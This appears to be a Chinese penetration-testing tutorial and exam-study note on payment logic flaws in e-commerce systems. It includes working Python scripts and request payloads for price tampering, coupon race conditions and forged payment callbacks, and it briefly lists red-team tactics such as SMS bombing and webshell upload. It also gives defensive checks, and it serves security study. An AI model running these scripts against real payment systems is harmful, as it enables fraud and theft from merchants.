# 渗透测试支付逻辑漏洞与业务安全实战

> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：渗透测试

## 📋 提纲

1. 支付漏洞分类
2. 金额篡改漏洞
3. 并发/竞态条件
4. 优惠券/积分漏洞
5. 订单状态篡改
6. 支付回调漏洞
7. 护网中的业务逻辑漏洞

---

## 1. 支付漏洞分类

```
支付流程 = 下单 → 支付 → 回调 → 发货

攻击点：
1. 下单阶段：修改金额/数量/商品ID
2. 支付阶段：并发请求/支付中断
3. 回调阶段：伪造回调/重复回调
4. 发货阶段：状态篡改/越权发货
```

---

## 2. 金额篡改

### 2.1 常见场景

```http
# 场景1: 前端传金额（最严重的错误）
POST /api/order/create
{
    "product_id": 1,
    "amount": 0.01    # 修改为0.01元
}
# 后端直接使用前端传来的amount → 0.01元购买任意商品

# 场景2: 修改数量为负数
POST /api/cart/add
{
    "product_id": 1,
    "quantity": -1     # 负数可能退款
}

# 场景3: 整型溢出
POST /api/order/create
{
    "product_id": 1,
    "quantity": 2147483647  # INT_MAX可能导致计算错误
}

# 场景4: 精度问题
POST /api/order/create  
{
    "amount": 0.009      # 四舍五入到分 → 0.00元
}
```

### 2.2 检测脚本

```python
#!/usr/bin/env python3
"""支付金额篡改自动化测试"""

import requests

PAYLOAD_MATRIX = [
    # 金额类
    {"amount": 0.01, "desc": "改小金额"},
    {"amount": 0, "desc": "金额为0"},
    {"amount": -1, "desc": "负金额"},
    {"amount": 0.009, "desc": "精度绕过"},
    {"amount": 999999999, "desc": "超大金额"},

    # 数量类
    {"quantity": 0, "desc": "数量为0"},
    {"quantity": -1, "desc": "负数量"},
    {"quantity": 2147483647, "desc": "INT_MAX溢出"},

    # 单价类
    {"unit_price": 0.01, "desc": "单价改为0.01"},
    {"unit_price": 0, "desc": "单价为0"},
]

for payload in PAYLOAD_MATRIX:
    resp = requests.post("https://target.com/api/order/create", json=payload)
    if resp.json().get('total_amount', 0) <= 0.01:
        print(f"⚠️ 漏洞: {payload['desc']} → {resp.text[:100]}")
```

---

## 3. 竞态条件

```python
#!/usr/bin/env python3
"""并发支付测试 - 多线程抢购"""

import threading
import requests

def race_condition_test():
    """测试：用1个优惠券并发使用N次"""
    results = []

    def use_coupon(coupon_id):
        resp = requests.post(
            "https://target.com/api/order/create",
            json={"coupon_id": coupon_id, "product_id": 1},
            headers={"Authorization": f"Bearer {TOKEN}"}
        )
        results.append(resp.status_code)

    # 10个线程同时使用同一张优惠券
    threads = []
    for i in range(10):
        t = threading.Thread(target=use_coupon, args=("COUPON-001",))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    # 统计成功次数
    success = sum(1 for r in results if r == 200)
    if success > 1:
        print(f"⚠️ 竞态条件漏洞：1张优惠券被使用{success}次！")
```

### 3.1 常见竞态场景

```
1. 优惠券/红包重复使用
2. 秒杀超卖（库存减到负数）
3. 提现重复提交
4. 注册奖励重复领取
5. 邀请奖励重复计算
```

---

## 4. 支付回调漏洞

```python
#!/usr/bin/env python3
"""支付回调伪造测试"""

def test_callback_bypass():
    """测试是否可以伪造支付回调"""

    # 正常支付回调格式（需逆向APP或抓包获取）
    fake_callback = {
        "order_id": "ORDER-2026-001",
        "trade_no": "TRADE-FAKE-001",
        "total_amount": "0.01",
        "status": "SUCCESS",
        "sign": "FAKE_SIGN"  # 尝试无签名
    }

    # 1. 测试无签名验证
    resp1 = requests.post("https://target.com/api/payment/callback", json=fake_callback)
    if resp1.status_code == 200 and "success" in resp1.text.lower():
        print("⚠️ 支付回调无签名验证！")

    # 2. 尝试重复回调
    resp2 = requests.post("https://target.com/api/payment/callback", json=fake_callback)
    if resp2.status_code == 200:
        print("⚠️ 支付回调可重复提交！（可能重复充值）")

    # 3. 修改金额
    fake_callback["total_amount"] = "0.01"
    resp3 = requests.post("https://target.com/api/payment/callback", json=fake_callback)
    if resp3.status_code == 200:
        print("⚠️ 回调金额未校验！（0.01元充值全款）")
```

---

## 5. 订单状态篡改

```bash
# 常见的状态流转漏洞
POST /api/order/status
{"order_id": "xxx", "status": "delivered"}  # 直接跳到已发货

# 修改他人订单
PUT /api/order/OTHER_USER_ORDER_ID/address
{"address": "我的地址"}  # 越权修改

# 取消已支付订单 → 金额退回但商品已发货
DELETE /api/order/PAID_ORDER_ID
```

---

## 6. 护网中的业务逻辑漏洞

护网期间，业务逻辑漏洞是最容易"送分"的：

```
红队最爱的业务漏洞：
1. 任意用户注册 → 发送钓鱼邮件用企业域名
2. 未授权API → 获取所有用户信息
3. 短信轰炸 → 骚扰目标人员
4. 文件上传 → Webshell
```

---

## ✅ 支付安全 Checklist

- [ ] 金额后端验证（不信任前端）
- [ ] 并发控制（优惠券/库存/提现）
- [ ] 支付回调签名验证
- [ ] 回调幂等性（防止重复回调）
- [ ] 订单状态机校验
- [ ] 越权修改他人订单测试
- [ ] 负数/0值/超大数据类型测试

> 📚 延伸阅读：Penetration/001-Web流程 | Penetration/015-逻辑漏洞 | CodeAudit/001-PHP审计

---

## 高分考点与知识巧记

### 高分考点速查表

| 考点 | 考察维度 | 记忆要点 |
|------|----------|----------|
| 支付漏洞分类 | 基础理论 | 金额篡改、并发/竞态条件、优惠券/积分滥用、订单状态篡改、支付回调漏洞 |
| 金额篡改攻击 | 业务逻辑 | 修改请求中金额参数(负数/0/超大值)；前端计算金额不可信 |
| 并发/竞态条件 | 高级技术 | 多线程并发请求→绕过库存/次数限制→超额领取/提现/消费 |
| 支付回调安全 | 接口安全 | 签名验证(防篡改)、幂等性(防重复回调)、状态机校验(防跳过支付) |
| 优惠券/积分漏洞 | 业务逻辑 | 并发领取、过期时间篡改、叠加规则绕过、跨用户使用 |
| 护网场景 | 实战防御 | 业务逻辑漏洞是护网"送分题"；任意用户注册/短信轰炸/未授权API最常见 |

### 知识巧记口诀

> **支付安全口诀**：
> 金额后端做校验，前端数字不可信；
> 负数零值都要测，整数溢出别忘记；
> 并发控制用锁或队列，库存次数防超领；
> 回调签名加幂等，订单状态机要严；
> 优惠券叠加测边界，跨用户使用是大忌。

> **竞态条件口诀**：并发发包是关键，Burp Turbo Intruder跑起来，多线程同时请求发，库存负数漏洞现。

### 考试陷阱提醒

| 陷阱 | 正确认知 |
|------|----------|
| ❌ 支付走HTTPS就安全了 | ✅ HTTPS只防传输层窃听，金额篡改、并发攻击发生在应用层，HTTPS无能为力 |
| ❌ 加了库存判断就不会超卖 | ✅ 检查和扣减不是原子操作→并发可绕过；需用数据库行锁或Redis原子操作 |
| ❌ 支付漏洞只影响电商 | ✅ 任何涉及金额/积分/库存/次数的系统都有支付逻辑漏洞风险(如提现、领券、秒杀) |

> 💡 **一句话总结**：支付逻辑漏洞是业务安全最核心的考点——金额篡改和竞态条件是两个最高频的方向，CISP考试重点考查业务逻辑漏洞的识别与防御。
